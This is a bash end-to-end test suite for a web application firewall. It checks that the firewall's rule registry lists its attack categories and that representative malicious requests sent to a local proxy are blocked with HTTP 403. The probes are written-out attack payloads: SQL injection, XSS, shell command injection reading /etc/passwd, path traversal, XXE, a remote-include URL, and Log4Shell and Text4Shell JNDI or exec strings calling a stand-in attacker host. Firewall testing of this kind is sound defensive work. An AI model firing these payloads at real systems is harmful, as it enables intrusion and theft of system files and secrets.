#!/usr/bin/env bash
# Rule Engine E2E suite.
#
# Verifies that:
#   1. Every rule YAML under rules/ parses and the WAF reports the expected
#      total via /api/rules/registry.
#   2. Each major rule category has at least one entry in the registry.
#   3. A representative malicious payload per category is blocked (HTTP 403)
#      by the proxy at :16880.
#
# Pre-requisites:
#   - tests/e2e/docker-compose.e2e.yml is running (postgres + httpbin + waf)
#
# Outputs: tests/e2e/out/rules-engine/{results.json,junit.xml,summary.md}

set -euo pipefail
cd "$(dirname "$0")/../.."

# shellcheck source=tests/e2e/lib.sh
source tests/e2e/lib.sh

PROXY="http://localhost:16880"
ADMIN="http://localhost:16827"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-admin123}"

e2e_init "rules-engine"

# ── 1) WAF must be healthy before we begin ──────────────────────────────────
if ! wait_health "WAF API"  "$ADMIN/health" 90; then
    fail "waf.health" "API never became healthy"
    e2e_finalize || true
    exit 1
fi
pass "waf.health"

# ── 2) Login (rules registry endpoint requires JWT) ─────────────────────────
LOGIN=$(http_get -X POST "$ADMIN/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$ADMIN_USER\",\"password\":\"$ADMIN_PASS\"}")
# Login response: { "success": true, "data": { "access_token": "...", ... } }
TOKEN=$(echo "$LOGIN" | grep -o '"access_token":"[^"]*"' | head -1 | cut -d'"' -f4 || echo "")

if [[ -z "$TOKEN" ]]; then
    fail "auth.login" "could not obtain JWT (admin seed missing?)"
    e2e_finalize || true
    exit 1
fi
pass "auth.login"

AUTH=( -H "Authorization: Bearer $TOKEN" )

# ── 3) Rule registry must enumerate every category ──────────────────────────
REGISTRY=$(http_get "${AUTH[@]}" "$ADMIN/api/rules/registry")
# Count occurrences of "id" via awk's gsub — single-process, returns 0 on
# no-match, so we sidestep the `grep | wc` pipeline failure under `pipefail`
# that would otherwise kill the whole suite before e2e_finalize ran.
RULE_COUNT=$(awk -v s="$REGISTRY" 'BEGIN{ n=gsub(/"id"/, "", s); print n }')
log "rule registry exposes $RULE_COUNT rules"
if [[ "$RULE_COUNT" -gt 0 ]]; then
    pass "registry.populated" "$RULE_COUNT rules"
else
    fail "registry.populated" "registry is empty"
fi

# Categories we expect to be present (sub-string match against registry JSON).
CATEGORIES=(
    "sqli"
    "xss"
    "rce"
    "lfi"
    "rfi"
    "scanner"
    "protocol-attack"
    "web-shell"
    "ssti"
    "ssrf"
    "xxe"
    "log4shell"
    "spring4shell"
    "data-leakage"
)

for cat in "${CATEGORIES[@]}"; do
    if echo "$REGISTRY" | grep -qi -- "$cat"; then
        pass "registry.category.$cat"
    else
        fail "registry.category.$cat" "no rule referencing '$cat' in registry"
    fi
done

# ── 4) Rule-blocking probes (each must produce HTTP 403) ────────────────────
# Helper: assert that <args...> applied to $PROXY returns 403.
expect_block() {
    local name="$1"; shift
    assert_http_status "block.$name" "403" "$@"
}

# OWASP CRS — SQLi
expect_block "sqli.boolean"     -G --data-urlencode "q=1' OR '1'='1"           "$PROXY/get"
expect_block "sqli.union"       -G --data-urlencode "q=' UNION SELECT pwd--"    "$PROXY/get"
expect_block "sqli.libinjection" -G --data-urlencode "id=1; DROP TABLE users--" "$PROXY/get"

# OWASP CRS — XSS
expect_block "xss.script-tag"   -G --data-urlencode "q=<script>alert(1)</script>" "$PROXY/get"
expect_block "xss.event-handler" -G --data-urlencode "q=<img src=x onerror=alert(1)>" "$PROXY/get"

# OWASP CRS — RCE
expect_block "rce.shell-meta"   -G --data-urlencode "cmd=;cat /etc/passwd"      "$PROXY/get"
expect_block "rce.cmd-subst"    -G --data-urlencode 'cmd=$(whoami)'             "$PROXY/get"

# OWASP CRS — Path traversal / LFI / RFI
expect_block "lfi.dotdot"       -G --data-urlencode "file=../../../../etc/passwd" "$PROXY/get"
expect_block "rfi.remote-url"   -G --data-urlencode "file=http://evil.example.com/x.php" "$PROXY/get"

# OWASP CRS — Scanner detection
expect_block "scanner.sqlmap"   -A "sqlmap/1.7"                                 "$PROXY/get"
expect_block "scanner.nikto"    -A "Nikto/2.1.6"                                "$PROXY/get"

# OWASP CRS — Web shells
expect_block "web-shell.c99"                                                   "$PROXY/c99.php"
expect_block "web-shell.wso"                                                   "$PROXY/wso.php"

# Advanced — SSTI / SSRF / XXE
expect_block "ssti.template"    -G --data-urlencode 'q={{7*7}}'                 "$PROXY/get"
expect_block "ssrf.metadata"    -G --data-urlencode "url=http://169.254.169.254/latest/meta-data/" "$PROXY/get"
expect_block "xxe.entity" -X POST -H "Content-Type: application/xml" \
    --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' \
    "$PROXY/post"

# CVE patches
expect_block "log4shell.header" -H 'X-Api-Version: ${jndi:ldap://attacker/x}'   "$PROXY/get"
expect_block "log4shell.ua"     -A '${jndi:ldap://attacker/x}'                  "$PROXY/get"
expect_block "spring4shell"     -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=evil" "$PROXY/get"
expect_block "text4shell"       -G --data-urlencode 'q=${script:javascript:java.lang.Runtime.getRuntime().exec("id")}' "$PROXY/get"

# ModSecurity — sensitive file access
expect_block "data-leakage.env-file"                                           "$PROXY/.env"
expect_block "data-leakage.git-config"                                         "$PROXY/.git/config"

# Bot detection
expect_block "bot.masscan"      -A "masscan/1.0"                                "$PROXY/get"

# ── 5) Negative control: a benign request must succeed ──────────────────────
assert_http_status "control.benign-get" "200" "$PROXY/get"

e2e_finalize
